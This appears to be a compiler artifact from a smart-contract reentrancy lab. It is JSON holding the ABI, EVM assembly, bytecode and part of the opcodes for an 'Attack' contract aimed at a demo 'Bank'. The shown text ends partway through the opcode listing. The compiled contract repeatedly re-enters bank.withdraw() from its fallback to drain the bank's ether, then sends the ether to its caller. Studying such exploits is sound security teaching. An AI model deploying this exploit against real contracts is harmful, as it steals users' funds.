{
	"重入攻击/bankDemo.sol": {
		"Attack": {
			"abi": [
				{
					"inputs": [
						{
							"internalType": "contract Bank",
							"name": "_bank",
							"type": "address"
						}
					],
					"stateMutability": "nonpayable",
					"type": "constructor"
				},
				{
					"stateMutability": "payable",
					"type": "fallback"
				},
				{
					"inputs": [],
					"name": "bank",
					"outputs": [
						{
							"internalType": "contract Bank",
							"name": "",
							"type": "address"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "doDeposit",
					"outputs": [],
					"stateMutability": "payable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "doWithdraw",
					"outputs": [],
					"stateMutability": "nonpayable",
					"type": "function"
				}
			],
			"devdoc": {
				"kind": "dev",
				"methods": {},
				"version": 1
			},
			"evm": {
				"assembly": "    /* \"重入攻击/bankDemo.sol\":922:1450  contract Attack {\r... */\n  mstore(0x40, 0x80)\n    /* \"重入攻击/bankDemo.sol\":972:1027  constructor(Bank _bank) {\r... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n  mload(0x40)\n  sub(codesize, bytecodeSize)\n  dup1\n  bytecodeSize\n  dup4\n  codecopy\n  dup2\n  dup2\n  add\n  0x40\n  mstore\n  dup2\n  add\n  swap1\n  tag_2\n  swap2\n  swap1\n  tag_3\n  jump\t// in\ntag_2:\n    /* \"重入攻击/bankDemo.sol\":1014:1019  _bank */\n  dup1\n    /* \"重入攻击/bankDemo.sol\":1007:1011  bank */\n  0x00\n  dup1\n    /* \"重入攻击/bankDemo.sol\":1007:1019  bank = _bank */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"重入攻击/bankDemo.sol\":972:1027  constructor(Bank _bank) {\r... */\n  pop\n    /* \"重入攻击/bankDemo.sol\":922:1450  contract Attack {\r... */\n  jump(tag_6)\n    /* \"#utility.yul\":7:172   */\ntag_8:\n    /* \"#utility.yul\":75:80   */\n  0x00\n    /* \"#utility.yul\":106:112   */\n  dup2\n    /* \"#utility.yul\":100:113   */\n  mload\n    /* \"#utility.yul\":91:113   */\n  swap1\n  pop\n    /* \"#utility.yul\":122:166   */\n  tag_10\n    /* \"#utility.yul\":160:165   */\n  dup2\n    /* \"#utility.yul\":122:166   */\n  tag_11\n  jump\t// in\ntag_10:\n    /* \"#utility.yul\":81:172   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":178:484   */\ntag_3:\n    /* \"#utility.yul\":259:265   */\n  0x00\n    /* \"#utility.yul\":308:310   */\n  0x20\n    /* \"#utility.yul\":296:305   */\n  dup3\n    /* \"#utility.yul\":287:294   */\n  dup5\n    /* \"#utility.yul\":283:306   */\n  sub\n    /* \"#utility.yul\":279:311   */\n  slt\n    /* \"#utility.yul\":276:278   */\n  iszero\n  tag_13\n  jumpi\n    /* \"#utility.yul\":324:325   */\n  0x00\n    /* \"#utility.yul\":321:322   */\n  dup1\n    /* \"#utility.yul\":314:326   */\n  revert\n    /* \"#utility.yul\":276:278   */\ntag_13:\n    /* \"#utility.yul\":367:368   */\n  0x00\n    /* \"#utility.yul\":392:467   */\n  tag_14\n    /* \"#utility.yul\":459:466   */\n  dup5\n    /* \"#utility.yul\":450:456   */\n  dup3\n    /* \"#utility.yul\":439:448   */\n  dup6\n    /* \"#utility.yul\":435:457   */\n  add\n    /* \"#utility.yul\":392:467   */\n  tag_8\n  jump\t// in\ntag_14:\n    /* \"#utility.yul\":382:467   */\n  swap2\n  pop\n    /* \"#utility.yul\":338:477   */\n  pop\n    /* \"#utility.yul\":266:484   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":490:586   */\ntag_15:\n    /* \"#utility.yul\":527:534   */\n  0x00\n    /* \"#utility.yul\":556:580   */\n  tag_17\n    /* \"#utility.yul\":574:579   */\n  dup3\n    /* \"#utility.yul\":556:580   */\n  tag_18\n  jump\t// in\ntag_17:\n    /* \"#utility.yul\":545:580   */\n  swap1\n  pop\n    /* \"#utility.yul\":535:586   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":592:699   */\ntag_19:\n    /* \"#utility.yul\":640:647   */\n  0x00\n    /* \"#utility.yul\":669:693   */\n  tag_21\n    /* \"#utility.yul\":687:692   */\n  dup3\n    /* \"#utility.yul\":669:693   */\n  tag_15\n  jump\t// in\ntag_21:\n    /* \"#utility.yul\":658:693   */\n  swap1\n  pop\n    /* \"#utility.yul\":648:699   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":705:831   */\ntag_18:\n    /* \"#utility.yul\":742:749   */\n  0x00\n    /* \"#utility.yul\":782:824   */\n  0xffffffffffffffffffffffffffffffffffffffff\n    /* \"#utility.yul\":775:780   */\n  dup3\n    /* \"#utility.yul\":771:825   */\n  and\n    /* \"#utility.yul\":760:825   */\n  swap1\n  pop\n    /* \"#utility.yul\":750:831   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":837:981   */\ntag_11:\n    /* \"#utility.yul\":921:956   */\n  tag_24\n    /* \"#utility.yul\":950:955   */\n  dup2\n    /* \"#utility.yul\":921:956   */\n  tag_19\n  jump\t// in\ntag_24:\n    /* \"#utility.yul\":914:919   */\n  dup2\n    /* \"#utility.yul\":911:957   */\n  eq\n    /* \"#utility.yul\":901:903   */\n  tag_25\n  jumpi\n    /* \"#utility.yul\":971:972   */\n  0x00\n    /* \"#utility.yul\":968:969   */\n  dup1\n    /* \"#utility.yul\":961:973   */\n  revert\n    /* \"#utility.yul\":901:903   */\ntag_25:\n    /* \"#utility.yul\":891:981   */\n  pop\n  jump\t// out\n    /* \"重入攻击/bankDemo.sol\":922:1450  contract Attack {\r... */\ntag_6:\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"重入攻击/bankDemo.sol\":922:1450  contract Attack {\r... */\n      mstore(0x40, 0x80)\n      jumpi(tag_1, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x76cdb03b\n      eq\n      tag_3\n      jumpi\n      dup1\n      0xb011fcf1\n      eq\n      tag_4\n      jumpi\n      dup1\n      0xe848df64\n      eq\n      tag_5\n      jumpi\n      jump(tag_2)\n    tag_1:\n    tag_2:\n        /* \"重入攻击/bankDemo.sol\":1118:1125  1 ether */\n      0x0de0b6b3a7640000\n        /* \"重入攻击/bankDemo.sol\":1097:1101  bank */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"重入攻击/bankDemo.sol\":1097:1112  bank.getBalance */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x12065fe0\n        /* \"重入攻击/bankDemo.sol\":1097:1114  bank.getBalance() */\n      mload(0x40)\n      dup2\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x20\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup7\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_8\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_8:\n      pop\n      gas\n      staticcall\n      iszero\n      dup1\n      iszero\n      tag_10\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_10:\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n      not(0x1f)\n      0x1f\n      dup3\n      add\n      and\n      dup3\n      add\n      dup1\n      0x40\n      mstore\n      pop\n      dup2\n      add\n      swap1\n      tag_11\n      swap2\n      swap1\n      tag_12\n      jump\t// in\n    tag_11:\n        /* \"重入攻击/bankDemo.sol\":1097:1125  bank.getBalance() >= 1 ether */\n      lt\n        /* \"重入攻击/bankDemo.sol\":1093:1169  if (bank.getBalance() >= 1 ether) {\r... */\n      tag_13\n      jumpi\n        /* \"重入攻击/bankDemo.sol\":1142:1146  bank */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"重入攻击/bankDemo.sol\":1142:1155  bank.withdraw */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x3ccfd60b\n        /* \"重入攻击/bankDemo.sol\":1142:1157  bank.withdraw() */\n      mload(0x40)\n      dup2\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_14\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_14:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_16\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_16:\n      pop\n      pop\n      pop\n      pop\n        /* \"重入攻击/bankDemo.sol\":1093:1169  if (bank.getBalance() >= 1 ether) {\r... */\n    tag_13:\n        /* \"重入攻击/bankDemo.sol\":922:1450  contract Attack {\r... */\n      stop\n        /* \"重入攻击/bankDemo.sol\":945:961  Bank public bank */\n    tag_3:\n      callvalue\n      dup1\n      iszero\n      tag_17\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_17:\n      pop\n      tag_18\n      tag_19\n      jump\t// in\n    tag_18:\n      mload(0x40)\n      tag_20\n      swap2\n      swap1\n      tag_21\n      jump\t// in\n    tag_20:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"重入攻击/bankDemo.sol\":1318:1445  function doWithdraw() external {\r... */\n    tag_4:\n      callvalue\n      dup1\n      iszero\n      tag_22\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_22:\n      pop\n      tag_23\n      tag_24\n      jump\t// in\n    tag_23:\n      stop\n        /* \"重入攻击/bankDemo.sol\":1202:1289  function doDeposit() external payable {\r... */\n    tag_5:\n      tag_25\n      tag_26\n      jump\t// in\n    tag_25:\n      stop\n        /* \"重入攻击/bankDemo.sol\":945:961  Bank public bank */\n    tag_19:\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      jump\t// out\n        /* \"重入攻击/bankDemo.sol\":1318:1445  function doWithdraw() external {\r... */\n    tag_24:\n        /* \"重入攻击/bankDemo.sol\":1360:1364  bank */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"重入攻击/bankDemo.sol\":1360:1373  bank.withdraw */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x3ccfd60b\n        /* \"重入攻击/bankDemo.sol\":1360:1375  bank.withdraw() */\n      mload(0x40)\n      dup2\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_28\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_28:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_30\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_30:\n      pop\n      pop\n      pop\n      pop\n        /* \"重入攻击/bankDemo.sol\":1394:1404  msg.sender */\n      caller\n        /* \"重入攻击/bankDemo.sol\":1386:1414  payable(msg.sender).transfer */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"重入攻击/bankDemo.sol\":1386:1437  payable(msg.sender).transfer(address(this).balance) */\n      0x08fc\n        /* \"重入攻击/bankDemo.sol\":1415:1436  address(this).balance */\n      selfbalance\n        /* \"重入攻击/bankDemo.sol\":1386:1437  payable(msg.sender).transfer(address(this).balance) */\n      swap1\n      dup2\n      iszero\n      mul\n      swap1\n      mload(0x40)\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup9\n      dup9\n      call\n      swap4\n      pop\n      pop\n      pop\n      pop\n      iszero\n      dup1\n      iszero\n      tag_32\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_32:\n      pop\n        /* \"重入攻击/bankDemo.sol\":1318:1445  function doWithdraw() external {\r... */\n      jump\t// out\n        /* \"重入攻击/bankDemo.sol\":1202:1289  function doDeposit() external payable {\r... */\n    tag_26:\n        /* \"重入攻击/bankDemo.sol\":1251:1255  bank */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"重入攻击/bankDemo.sol\":1251:1263  bank.deposit */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xd0e30db0\n        /* \"重入攻击/bankDemo.sol\":1271:1278  1 ether */\n      0x0de0b6b3a7640000\n        /* \"重入攻击/bankDemo.sol\":1251:1281  bank.deposit{value: 1 ether}() */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup9\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_34\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_34:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_36\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_36:\n      pop\n      pop\n      pop\n      pop\n      pop\n        /* \"重入攻击/bankDemo.sol\":1202:1289  function doDeposit() external payable {\r... */\n      jump\t// out\n        /* \"#utility.yul\":7:150   */\n    tag_38:\n        /* \"#utility.yul\":64:69   */\n      0x00\n        /* \"#utility.yul\":95:101   */\n      dup2\n        /* \"#utility.yul\":89:102   */\n      mload\n        /* \"#utility.yul\":80:102   */\n      swap1\n      pop\n        /* \"#utility.yul\":111:144   */\n      tag_40\n        /* \"#utility.yul\":138:143   */\n      dup2\n        /* \"#utility.yul\":111:144   */\n      tag_41\n      jump\t// in\n    tag_40:\n        /* \"#utility.yul\":70:150   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":156:440   */\n    tag_12:\n        /* \"#utility.yul\":226:232   */\n      0x00\n        /* \"#utility.yul\":275:277   */\n      0x20\n        /* \"#utility.yul\":263:272   */\n      dup3\n        /* \"#utility.yul\":254:261   */\n      dup5\n        /* \"#utility.yul\":250:273   */\n      sub\n        /* \"#utility.yul\":246:278   */\n      slt\n        /* \"#utility.yul\":243:245   */\n      iszero\n      tag_43\n      jumpi\n        /* \"#utility.yul\":291:292   */\n      0x00\n        /* \"#utility.yul\":288:289   */\n      dup1\n        /* \"#utility.yul\":281:293   */\n      revert\n        /* \"#utility.yul\":243:245   */\n    tag_43:\n        /* \"#utility.yul\":334:335   */\n      0x00\n        /* \"#utility.yul\":359:423   */\n      tag_44\n        /* \"#utility.yul\":415:422   */\n      dup5\n        /* \"#utility.yul\":406:412   */\n      dup3\n        /* \"#utility.yul\":395:404   */\n      dup6\n        /* \"#utility.yul\":391:413   */\n      add\n        /* \"#utility.yul\":359:423   */\n      tag_38\n      jump\t// in\n    tag_44:\n        /* \"#utility.yul\":349:423   */\n      swap2\n      pop\n        /* \"#utility.yul\":305:433   */\n      pop\n        /* \"#utility.yul\":233:440   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":446:599   */\n    tag_45:\n        /* \"#utility.yul\":544:592   */\n      tag_47\n        /* \"#utility.yul\":586:591   */\n      dup2\n        /* \"#utility.yul\":544:592   */\n      tag_48\n      jump\t// in\n    tag_47:\n        /* \"#utility.yul\":539:542   */\n      dup3\n        /* \"#utility.yul\":532:593   */\n      mstore\n        /* \"#utility.yul\":522:599   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":605:849   */\n    tag_21:\n        /* \"#utility.yul\":709:713   */\n      0x00\n        /* \"#utility.yul\":747:749   */\n      0x20\n        /* \"#utility.yul\":736:745   */\n      dup3\n        /* \"#utility.yul\":732:750   */\n      add\n        /* \"#utility.yul\":724:750   */\n      swap1\n      pop\n        /* \"#utility.yul\":760:842   */\n      tag_50\n        /* \"#utility.yul\":839:840   */\n      0x00\n        /* \"#utility.yul\":828:837   */\n      dup4\n        /* \"#utility.yul\":824:841   */\n      add\n        /* \"#utility.yul\":815:821   */\n      dup5\n        /* \"#utility.yul\":760:842   */\n      tag_45\n      jump\t// in\n    tag_50:\n        /* \"#utility.yul\":714:849   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":855:981   */\n    tag_51:\n        /* \"#utility.yul\":892:899   */\n      0x00\n        /* \"#utility.yul\":932:974   */\n      0xffffffffffffffffffffffffffffffffffffffff\n        /* \"#utility.yul\":925:930   */\n      dup3\n        /* \"#utility.yul\":921:975   */\n      and\n        /* \"#utility.yul\":910:975   */\n      swap1\n      pop\n        /* \"#utility.yul\":900:981   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":987:1064   */\n    tag_53:\n        /* \"#utility.yul\":1024:1031   */\n      0x00\n        /* \"#utility.yul\":1053:1058   */\n      dup2\n        /* \"#utility.yul\":1042:1058   */\n      swap1\n      pop\n        /* \"#utility.yul\":1032:1064   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1070:1218   */\n    tag_48:\n        /* \"#utility.yul\":1131:1140   */\n      0x00\n        /* \"#utility.yul\":1164:1212   */\n      tag_56\n        /* \"#utility.yul\":1206:1211   */\n      dup3\n        /* \"#utility.yul\":1164:1212   */\n      tag_57\n      jump\t// in\n    tag_56:\n        /* \"#utility.yul\":1151:1212   */\n      swap1\n      pop\n        /* \"#utility.yul\":1141:1218   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1224:1348   */\n    tag_57:\n        /* \"#utility.yul\":1285:1294   */\n      0x00\n        /* \"#utility.yul\":1318:1342   */\n      tag_59\n        /* \"#utility.yul\":1336:1341   */\n      dup3\n        /* \"#utility.yul\":1318:1342   */\n      tag_51\n      jump\t// in\n    tag_59:\n        /* \"#utility.yul\":1305:1342   */\n      swap1\n      pop\n        /* \"#utility.yul\":1295:1348   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1354:1476   */\n    tag_41:\n        /* \"#utility.yul\":1427:1451   */\n      tag_61\n        /* \"#utility.yul\":1445:1450   */\n      dup2\n        /* \"#utility.yul\":1427:1451   */\n      tag_53\n      jump\t// in\n    tag_61:\n        /* \"#utility.yul\":1420:1425   */\n      dup2\n        /* \"#utility.yul\":1417:1452   */\n      eq\n        /* \"#utility.yul\":1407:1409   */\n      tag_62\n      jumpi\n        /* \"#utility.yul\":1466:1467   */\n      0x00\n        /* \"#utility.yul\":1463:1464   */\n      dup1\n        /* \"#utility.yul\":1456:1468   */\n      revert\n        /* \"#utility.yul\":1407:1409   */\n    tag_62:\n        /* \"#utility.yul\":1397:1476   */\n      pop\n      jump\t// out\n\n    auxdata: 0xa26469706673582212201d29099e0afc0a58273b493f1f20759d0ccf60e2c015425184522cc67ae0096f64736f6c63430008040033\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "608060405234801561001057600080fd5b5060405161054f38038061054f8339818101604052810190610032919061008d565b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610111565b600081519050610087816100fa565b92915050565b60006020828403121561009f57600080fd5b60006100ad84828501610078565b91505092915050565b60006100c1826100da565b9050919050565b60006100d3826100b6565b9050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b610103816100c8565b811461010e57600080fd5b50565b61042f806101206000396000f3fe6080604052600436106100385760003560e01c806376cdb03b14610168578063b011fcf114610193578063e848df64146101aa57610039565b5b670de0b6b3a764000060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166312065fe06040518163ffffffff1660e01b815260040160206040518083038186803b1580156100a857600080fd5b505afa1580156100bc573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906100e09190610341565b106101665760008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561014d57600080fd5b505af1158015610161573d6000803e3d6000fd5b505050505b005b34801561017457600080fd5b5061017d6101b4565b60405161018a9190610379565b60405180910390f35b34801561019f57600080fd5b506101a86101d8565b005b6101b26102a1565b005b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561024057600080fd5b505af1158015610254573d6000803e3d6000fd5b505050503373ffffffffffffffffffffffffffffffffffffffff166108fc479081150290604051600060405180830381858888f1935050505015801561029e573d6000803e3d6000fd5b50565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d0e30db0670de0b6b3a76400006040518263ffffffff1660e01b81526004016000604051808303818588803b15801561031157600080fd5b505af1158015610325573d6000803e3d6000fd5b5050505050565b60008151905061033b816103e2565b92915050565b60006020828403121561035357600080fd5b60006103618482850161032c565b91505092915050565b610373816103be565b82525050565b600060208201905061038e600083018461036a565b92915050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b60006103c9826103d0565b9050919050565b60006103db82610394565b9050919050565b6103eb816103b4565b81146103f657600080fd5b5056fea26469706673582212201d29099e0afc0a58273b493f1f20759d0ccf60e2c015425184522cc67ae0096f64736f6c63430008040033",
					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0x54F CODESIZE SUB DUP1 PUSH2 0x54F DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE DUP2 ADD SWAP1 PUSH2 0x32 SWAP2 SWAP1 PUSH2 0x8D JUMP JUMPDEST DUP1 PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP POP PUSH2 0x111 JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP PUSH2 0x87 DUP2 PUSH2 0xFA JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x9F JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH2 0xAD DUP5 DUP3 DUP6 ADD PUSH2 0x78 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0xC1 DUP3 PUSH2 0xDA JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0xD3 DUP3 PUSH2 0xB6 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x103 DUP2 PUSH2 0xC8 JUMP JUMPDEST DUP2 EQ PUSH2 0x10E JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH2 0x42F DUP1 PUSH2 0x120 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x38 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x76CDB03B EQ PUSH2 0x168 JUMPI DUP1 PUSH4 0xB011FCF1 EQ PUSH2 0x193 JUMPI DUP1 PUSH4 0xE848DF64 EQ PUSH2 0x1AA JUMPI PUSH2 0x39 JUMP JUMPDEST JUMPDEST PUSH8 0xDE0B6B3A7640000 PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x12065FE0 PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0xA8 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0xBC JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0xE0 SWAP2 SWAP1 PUSH2 0x341 JUMP JUMPDEST LT PUSH2 0x166 JUMPI PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x3CCFD60B PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x14D JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x161 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x174 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x17D PUSH2 0x1B4 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x18A SWAP2 SWAP1 PUSH2 0x379 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x19F JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x1A8 PUSH2 0x1D8 JUMP JUMPDEST STOP JUMPDEST PUSH2 0x1B2 PUSH2 0x2A1 JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x3CCFD60B PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x240 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x254 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x8FC SELFBALANCE SWAP1 DUP2 ISZERO MUL SWAP1 PUSH1 0x40 MLOAD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 